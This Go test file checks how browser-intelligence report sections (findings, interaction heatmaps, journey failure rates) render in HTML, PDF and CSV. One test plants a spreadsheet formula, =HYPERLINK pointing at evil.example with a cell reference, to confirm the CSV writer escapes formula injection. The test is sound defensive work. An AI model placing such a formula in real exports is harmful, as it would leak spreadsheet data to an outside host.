package api

import (
	"bytes"
	"context"
	"strings"
	"testing"
	"time"
)

func browserIntelligenceReportFixture() *ReportBrowserIntelligence {
	score, observed, index, rate := 72.5, 3100.0, 0.125, 0.25
	return &ReportBrowserIntelligence{
		Findings: &RunBrowserFindingsResponse{RunID: "run-1", Status: "ready", Result: &BrowserIntelligenceResult{
			Policy: BrowserPolicyRef{ID: "policy-1", Name: "Vitals", Revision: 3},
			Score:  BrowserScore{Score: &score, Severity: "needs_improvement"},
			Findings: []BrowserFinding{
				{RuleID: "metric.poor", Metric: "lcp", Unit: "ms", Cohort: &BrowserFindingCohort{Engine: "webkit", DeviceProfile: "iphone_15"}, State: "active", Severity: "poor", Observed: &observed, Summary: "LCP p75 is poor."},
				{RuleID: "collection.incomplete", State: "suppressed", Summary: "Some documents were dropped."},
			},
			Counts: map[string]int{"active": 1, "suppressed": 1},
			Notes:  []string{"Scores weigh only qualified final documents."},
		}},
		Interactions: &BrowserInteractionAnalysis{Version: "browser_interaction_patterns.v1", Status: "ready",
			Coverage: BrowserInteractionCoverage{Interactions: 40, Mapped: 30, Dropped: 2},
			Patterns: []BrowserInteractionPattern{{Kind: "scripted_repetition", Provenance: "scripted", Route: "/cart", ActionName: "Add to cart", Count: 4, Detail: "4 clicks within 2 s"}},
			Heatmaps: []BrowserInteractionHeatmap{{Route: "/cart", LayoutRevision: "L1", ViewportWidth: 390, ViewportHeight: 844, Orientation: "portrait", Engine: "webkit", DeviceProfile: "iphone_15", Columns: 64, Rows: 64, Cells: [][3]int{{1, 2, 3}}, Points: 3}},
			Notes:    []string{"Heatmaps show where gestures were dispatched."}},
		Journeys: &JourneyRiskReport{Availability: "available", Policy: JourneyPolicyRef{ID: "journeys-1", Name: "Shop", Revision: 2}, WeightedFailureIndex: &index,
			Journeys: []JourneyAccounting{{ID: "checkout-web", Name: "Checkout", Eligible: 8, Completed: 6, Failed: 2, FailureRate: &rate}, {ID: "checkout-app", Name: "Checkout", Eligible: 1, Completed: 1}}, Notes: []string{"Censored attempts are not failures."}},
	}
}

func renderBrowserIntelligenceSections(t *testing.T, report *RunArchiveReport) map[string][3]string {
	t.Helper()
	profile, ok := lookupRunArchiveReportProfile("engineer")
	if !ok {
		t.Fatal("no engineer profile")
	}
	data := buildRunArchiveReportRenderData(report, profile, nil, consistencyMatrixManifest())
	out := map[string][3]string{}
	for _, id := range browserIntelligenceReportSections {
		renderer := reportSectionRegistry[id]
		html, err := renderer.HTML(&data)
		if err != nil {
			t.Fatalf("%s HTML: %v", id, err)
		}
		var pdf []string
		renderer.PDF(&data, &pdf)
		var csv strings.Builder
		if err := renderer.CSV(&data, func(a, b, c, d string) error { csv.WriteString(a + "," + b + "," + c + "," + d + "\n"); return nil }); err != nil {
			t.Fatalf("%s CSV: %v", id, err)
		}
		out[id] = [3]string{string(html), strings.Join(pdf, "\n"), csv.String()}
	}
	return out
}

// The three browser intelligence sections render the attached results in
// HTML, PDF and CSV (BI-4).
func TestBrowserIntelligenceReportSectionsRenderTheirResults(t *testing.T) {
	report := consistencyMatrixReport()
	report.BrowserIntelligence = browserIntelligenceReportFixture()
	sections := renderBrowserIntelligenceSections(t, report)
	expect := map[string][]string{
		reportSectionBrowserFindings: {"Score 72.5/100 (needs improvement) under Vitals revision 3", "LCP · webkit / iphone_15", "3100 ms", "LCP p75 is poor.", "Scores weigh only qualified final documents."},
		reportSectionInteractionMap:  {"1 patterns and 1 heatmaps from 40 interactions (30 mapped, 2 dropped)", "scripted_repetition", "Add to cart", "390×844 portrait", "Heatmaps show where gestures were dispatched."},
		// Two journeys share a name; each is told apart by its ID.
		reportSectionJourneyRisk: {"Weighted failure index 0.125 under Shop revision 2", "Checkout", "checkout-web", "checkout-app", "25.0%", "Censored attempts are not failures."},
	}
	for id, wants := range expect {
		for index, format := range []string{"HTML", "PDF", "CSV"} {
			for _, want := range wants {
				if !strings.Contains(sections[id][index], want) {
					t.Errorf("%s %s lacks %q:\n%s", id, format, want, sections[id][index])
				}
			}
		}
	}
}

// Rows past a section's limit are counted in every format, the CSV
// included.
func TestBrowserIntelligenceReportSectionsCountWhatTheyLeaveOut(t *testing.T) {
	report := consistencyMatrixReport()
	report.BrowserIntelligence = browserIntelligenceReportFixture()
	result := report.BrowserIntelligence.Findings.Result
	for len(result.Findings) <= reportBrowserFindingsLimit {
		result.Findings = append(result.Findings, result.Findings[0])
	}
	analysis := report.BrowserIntelligence.Interactions
	for len(analysis.Patterns) <= reportInteractionPatternLimit {
		analysis.Patterns = append(analysis.Patterns, analysis.Patterns[0])
	}
	for len(analysis.Heatmaps) <= reportInteractionHeatmapLimit {
		analysis.Heatmaps = append(analysis.Heatmaps, analysis.Heatmaps[0])
	}
	sections := renderBrowserIntelligenceSections(t, report)
	for id, wants := range map[string][]string{
		reportSectionBrowserFindings: {"1 more findings are in the run report."},
		reportSectionInteractionMap:  {"1 more patterns are in the run report.", "1 more heatmaps are in the run report."},
	} {
		for index, format := range []string{"HTML", "PDF"} {
			for _, want := range wants {
				if !strings.Contains(sections[id][index], want) {
					t.Errorf("%s %s lacks %q:\n%s", id, format, want, sections[id][index])
				}
			}
		}
	}
	for id, want := range map[string][]string{
		reportSectionBrowserFindings: {"browser_findings,,more_findings,1"},
		reportSectionInteractionMap:  {"interaction_map,,more_patterns,1", "interaction_map,,more_heatmaps,1"},
	} {
		for _, row := range want {
			if !strings.Contains(sections[id][2], row) {
				t.Errorf("%s CSV lacks %q:\n%s", id, row, sections[id][2])
			}
		}
	}
}

// A section without a result says why, in every format.
func TestBrowserIntelligenceReportSectionsSayWhyAResultIsMissing(t *testing.T) {
	report := consistencyMatrixReport()
	report.BrowserIntelligence = nil
	for id, formats := range renderBrowserIntelligenceSections(t, report) {
		for _, body := range formats {
			if !strings.Contains(body, "generated without browser intelligence results") {
				t.Errorf("%s: %s", id, body)
			}
		}
	}
	report.BrowserIntelligence = &ReportBrowserIntelligence{
		Findings:     &RunBrowserFindingsResponse{Status: "pending"},
		Interactions: &BrowserInteractionAnalysis{Status: "not_captured"},
		Journeys:     &JourneyRiskReport{Availability: "unavailable", Reason: "no_iterations"},
	}
	sections := renderBrowserIntelligenceSections(t, report)
	for id, want := range map[string]string{
		reportSectionBrowserFindings: "queued or running",
		reportSectionInteractionMap:  "captured no interaction evidence",
		reportSectionJourneyRisk:     "unavailable for this run: no_iterations",
	} {
		for _, body := range sections[id] {
			if !strings.Contains(body, want) {
				t.Errorf("%s lacks %q: %s", id, want, body)
			}
		}
	}
}

// Exports read the results only for a profile that renders them, and name
// what could not be read.
func TestBrowserIntelligenceIsAttachedOnlyForProfilesThatRenderIt(t *testing.T) {
	server, id, record := harDownloadFixture(t)
	manifest, err := loadRunArchiveManifestFromRecord(record)
	if err != nil {
		t.Fatal(err)
	}
	executive := &RunArchiveReport{Manifest: manifest}
	server.attachBrowserIntelligenceForProfile(context.Background(), executive, "executive")
	if executive.BrowserIntelligence != nil {
		t.Fatal("the executive profile, which renders no browser section, read browser results")
	}
	engineer := &RunArchiveReport{Manifest: manifest}
	server.attachBrowserIntelligenceForProfile(context.Background(), engineer, "engineer")
	got := engineer.BrowserIntelligence
	if got == nil || got.Findings == nil || got.Findings.Status != "not_evaluated" || got.Findings.RunID != id {
		t.Fatalf("findings %+v", got)
	}
	for _, section := range []string{reportSectionInteractionMap, reportSectionJourneyRisk} {
		if got.Unavailable[section] == "" {
			t.Errorf("%s has no reason: %+v", section, got.Unavailable)
		}
	}
	// Rendering the attached report states each reason.
	var csv bytes.Buffer
	if err := writeRunArchiveReportCSVWithProfile(&RunArchiveReport{Manifest: manifest, BrowserIntelligence: got}, &csv, "engineer"); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(csv.String(), "Interaction patterns read the finalized archive, which is not available yet.") {
		t.Fatalf("CSV lacks the interaction reason:\n%s", csv.String())
	}
}

// Report CSV cells an editor or the target authored never become spreadsheet
// formulas; numbers, negative ones included, stay numbers.
func TestReportCSVCellsAreSpreadsheetSafe(t *testing.T) {
	report := consistencyMatrixReport()
	report.BrowserIntelligence = browserIntelligenceReportFixture()
	report.BrowserIntelligence.Journeys.Journeys[0].Name = `=HYPERLINK("https://evil.example/?"&A1,"Checkout")`
	var out bytes.Buffer
	if err := writeRunArchiveReportCSVWithProfile(report, &out, "engineer"); err != nil {
		t.Fatal(err)
	}
	if body := out.String(); strings.Contains(body, "\n=HYPERLINK") || strings.Contains(body, ",=HYPERLINK") || !strings.Contains(body, `'=HYPERLINK`) {
		t.Fatalf("a formula reached the CSV:\n%s", body)
	}
	for value, want := range map[string]string{"-12.5": "-12.5", "+3": "+3", "-": "'-", "@sum": "'@sum", "Checkout": "Checkout"} {
		if got := reportCSVSafeCell(value); got != want {
			t.Errorf("reportCSVSafeCell(%q) = %q, want %q", value, got, want)
		}
	}
}

func TestBrowserInteractionCohortsSurviveReportFormats(t *testing.T) {
	report := consistencyMatrixReport()
	report.BrowserIntelligence = browserIntelligenceReportFixture()
	analysis := report.BrowserIntelligence.Interactions
	analysis.Version = browserInteractionAnalysisVersion
	analysis.Coverage.Excluded = map[string]int64{"engine_profile_unknown": 2, "layout_unknown": 1}
	first := analysis.Heatmaps[0]
	first.DeviceScaleFactor = 2
	first.Scroll = &BrowserInteractionScroll{MinY: 0.25, MaxY: 0.25}
	second := first
	second.Scroll = &BrowserInteractionScroll{MinY: 100, MaxY: 100}
	analysis.Heatmaps = []BrowserInteractionHeatmap{first, second}
	rendered := renderBrowserIntelligenceSections(t, report)[reportSectionInteractionMap]
	for index, format := range []string{"HTML", "PDF", "CSV"} {
		for _, want := range []string{"browser_interaction_patterns.v2", "@2x", "recorded scroll x 0–0 px, y 0.25–0.25 px", "recorded scroll x 0–0 px, y 100–100 px", "Not mapped: 2 engine_profile_unknown.", "Not mapped: 1 layout_unknown."} {
			if !strings.Contains(rendered[index], want) {
				t.Errorf("%s lacks %q", format, want)
			}
		}
	}
}

func TestBrowserInteractionV3QualificationSurvivesReportFormats(t *testing.T) {
	report := consistencyMatrixReport()
	report.BrowserIntelligence = browserIntelligenceReportFixture()
	first, second, third := v3Interaction(1, 0), v3Interaction(2, time.Second/2), v3Interaction(3, time.Second)
	result := analyzeV3(first, second, third, e4Tap(4, 0, 100, 100))
	report.BrowserIntelligence.Interactions = &result
	rendered := renderBrowserIntelligenceSections(t, report)[reportSectionInteractionMap]
	for index, format := range []string{"HTML", "PDF", "CSV"} {
		for _, want := range []string{"browser_interaction_patterns.v3", "Pattern-eligible gestures: 3.", "Excluded from patterns: 1 legacy_identity_unavailable.", "native dispatch geometry", "historical post-action geometry", first.AuthoredStep.StepID, first.AuthoredStep.ScriptSHA256} {
			if !strings.Contains(rendered[index], want) {
				t.Errorf("%s lacks %q", format, want)
			}
		}
	}
}
